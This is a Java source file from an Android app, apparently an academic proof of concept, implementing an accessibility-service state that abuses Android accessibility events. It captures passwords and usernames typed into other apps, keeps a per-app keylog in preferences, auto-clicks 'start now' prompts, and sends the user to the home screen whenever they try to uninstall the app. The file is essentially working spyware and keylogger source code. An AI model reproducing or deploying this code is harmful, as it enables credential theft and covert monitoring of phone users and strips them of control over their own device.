package de.fau.i1.aka.avt.Accessibility;

import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.util.HashSet;
import java.util.List;
import java.util.Objects;

import de.fau.i1.aka.avt.R;
import de.fau.i1.aka.avt.Services.AccessibilityServiceSM;

import static de.fau.i1.aka.avt.Services.AccessibilityServiceSM.PREFS_SNIFFED_PACKAGE_NAMES;
import static de.fau.i1.aka.avt.Services.AccessibilityServiceSM.PREFS_SNIFFED_PACKAGE_NAMES_KEYBOARD;
import static de.fau.i1.aka.avt.Services.AccessibilityServiceSM.debug;

/**
 * Created by Anatoli Kalysch (anatoli.kalysch@fau.de), Department of Computer Science, Friedrich-Alexander University Erlangen-Nuremberg, on 13.11.17.
 */

class AccessibilityStateWatcher extends AccessibilityState {
    private final static Character DOT = '•'; // '\u2022'
    private final static String KEYBOARD_SNIFF_TAG = "KeyBoardSniff";

    // passive sniffing
    private Character[] passwordBuffer = resetBuffer();
    private Character[] usernameBuffer = resetBuffer();
    private String passPackageName;


    private Character[] resetBuffer() {
        Character[] buffer = new Character[64];
        for (int i = 0; i < 64; i++) {
            buffer[i] = null;
        }
        return buffer;
    }

    public AccessibilityStateWatcher(AccessibilityServiceSM accessibilityServiceSM) {
        super(accessibilityServiceSM);
    }

    protected void announcement(AccessibilityEvent event) {
        CharSequence packageName = event.getPackageName();
        if (String.valueOf(packageName).contains("fau.i1.aka.")) {
            try {
                String eventText = String.valueOf(event.getText());
                AccessibilityNodeInfo source = event.getSource();
                String originalPackage = String.valueOf(event.getBeforeText());

                HashSet<String> sniffedPackageNames = (HashSet<String>) context.queryPreferences().getStringSet(PREFS_SNIFFED_PACKAGE_NAMES_KEYBOARD, null);
                if (sniffedPackageNames == null) sniffedPackageNames = new HashSet<>();
                sniffedPackageNames.add(originalPackage);
                context.queryPreferences().edit().putStringSet(PREFS_SNIFFED_PACKAGE_NAMES_KEYBOARD, sniffedPackageNames).apply();

                if (event.isPassword()) { // save password
                    context.queryPreferences().edit().putString(originalPackage + "keypass", eventText).apply();
                    if (debug) Log.v(KEYBOARD_SNIFF_TAG, originalPackage + ":" + "keypass" + ":" + eventText);
                } else {
                    if (context.queryPreferences().getString(originalPackage + "keypass", null) == null) { // if password is not yet saved we are probably sniffing the username
                        context.queryPreferences().edit().putString(originalPackage + "keyuser", eventText).apply();
                        if (debug) Log.v(KEYBOARD_SNIFF_TAG, originalPackage + ":" + "keyuser" + ":" + eventText);
                    } else { // log what user typed during session
                        String prevLog = context.queryPreferences().getString(originalPackage + "keylog", " ");
                        prevLog = prevLog + "\n" + eventText;
                        if (debug) Log.v(KEYBOARD_SNIFF_TAG, originalPackage + ":" + "keylog" + ":" + prevLog);
                        context.queryPreferences().edit().putString(originalPackage + "keylog", prevLog).apply();
                    }
                }
            } catch (Exception ignored) {}
        }
    }

    /**
     * This method subsumes the protection measure of our service. If the user tries to uninstall the
     * application by dragging it to the "uninstall" symbol on the home screen simply stop the event.
     * @param event - the accessibility event
     */
    @Override
    protected void viewSelected(AccessibilityEvent event) {
        // disallow user from uninstalling our app via drag and drop from launcher
        String eventText = String.valueOf(event.getText());
        if (eventText.toLowerCase().contains("uninstall")) {
            dispatchHomeScreenIntent();
        }
    }

    /**
     * This method subsumes one of the protection measure of our service. If settings is called and
     * our app is to be uninstalled just send the user back to the home screen.
     * @param event - the accessibility event
     */
    @Override
    protected void windowStateChanged(AccessibilityEvent event) {
        CharSequence packageName = event.getPackageName();
        AccessibilityNodeInfo source = event.getSource();

        if (source == null) {
            return;
        }

        // disallow the user from uninstalling our app via settings
        List<AccessibilityNodeInfo> s_m = source.findAccessibilityNodeInfosByText(context.getString(R.string.app_name));
        List<AccessibilityNodeInfo> appInfo = source.findAccessibilityNodeInfosByText(context.getString(R.string.appInfo));
        List<AccessibilityNodeInfo> uninstall = source.findAccessibilityNodeInfosByText(context.getString(R.string.uninstall));
        if ((s_m.size() > 0
                        && appInfo.size() > 0
                        && uninstall.size() > 0
                        && String.valueOf(packageName).toLowerCase().contains("settings"))) {
            dispatchHomeScreenIntent();
        }

        findAndClickByText(source, "start now");


        source.recycle();
    }

    @Override
    protected void viewTextSelectionChanged(AccessibilityEvent event) {
        String eventText = String.valueOf(event.getText());
        eventText = eventText.substring(1, eventText.length()-1);
        AccessibilityNodeInfo source = event.getSource();
        if (source == null) {
            return;
        }

        if (source.isPassword()) {
            passPackageName = String.valueOf(event.getPackageName());

            for (int i = 0; i < eventText.length(); i++) {
                if (!Objects.equals(DOT, eventText.charAt(i))) {
                    passwordBuffer[i] = eventText.charAt(i);
                }
            }

        } else {
            if (source.isEditable()) {
                for (int i = 0; i < eventText.length(); i++) {
                    usernameBuffer[i] = eventText.charAt(i);
                }
            }
        }
    }

    /**
     * Build a String from a Character array.
     */
    private String buildStringfromChararray(Character[] chars) {
        StringBuilder sb = new StringBuilder();
        for (Character s : chars) {
            if (s == null) break;
            sb.append(s);
        }
        return sb.toString();
    }


    @Override
    protected AccessibilityStateEnum getNextState() {
        // change selfState in the AccessibilityEvent handling methods
        return AccessibilityStateEnum.WATCHER;
    }
}
